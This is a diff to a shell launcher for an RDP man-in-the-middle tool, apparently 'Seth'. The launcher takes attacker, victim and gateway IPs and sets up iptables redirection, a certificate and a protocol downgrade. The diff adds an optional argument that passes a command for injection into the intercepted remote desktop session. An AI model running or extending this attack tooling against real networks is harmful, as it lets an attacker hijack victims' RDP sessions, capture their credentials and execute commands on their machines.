@@ -16,10 +16,10 @@ if [ "$(id -u)" != "0" ]; then
     exit 1
 fi
 
-if [ "$#" -ne 4 ]; then
+if [ "$#" -ne 4 -a "$#" -ne 5 ]; then
     cat << EOF
 Usage:
-$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP|HOST_IP>
+$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP|HOST_IP> [<COMMAND>]
 EOF
     exit 1
 fi
@@ -35,6 +35,7 @@ IFACE="$1"
 ATTACKER_IP="$2"
 VICTIM_IP="$3"
 GATEWAY_IP="$4"
+INJECT_COMMAND="$5"
 
 if [ -z "$SETH_DOWNGRADE" ] ; then
     SETH_DOWNGRADE=3
@@ -42,6 +43,10 @@ fi
 
 if [ ! -z "$SETH_DEBUG" ] ; then
     DEBUG_FLAG="-d"
+fi
+
+if [ ! -z "$INJECT_COMMAND" ] ; then
+    INJECT_COMMAND="-j \"$INJECT_COMMAND\""
 fi
 
 IP_FORWARD="$(cat /proc/sys/net/ipv4/ip_forward)"
@@ -129,6 +134,6 @@ set_iptables_2 A "$VICTIM_IP" "$ATTACKER_IP" "$ORIGINAL_DEST"
 echo "[*] Run RDP proxy..."
 
 $SCRIPT_DIR/seth.py \
-    $DEBUG_FLAG -g "$SETH_DOWNGRADE" \
+    $INJECT_COMMAND $DEBUG_FLAG -g "$SETH_DOWNGRADE"\
     -c "$CERTPATH" -k "$KEYPATH" \
     "$ORIGINAL_DEST"
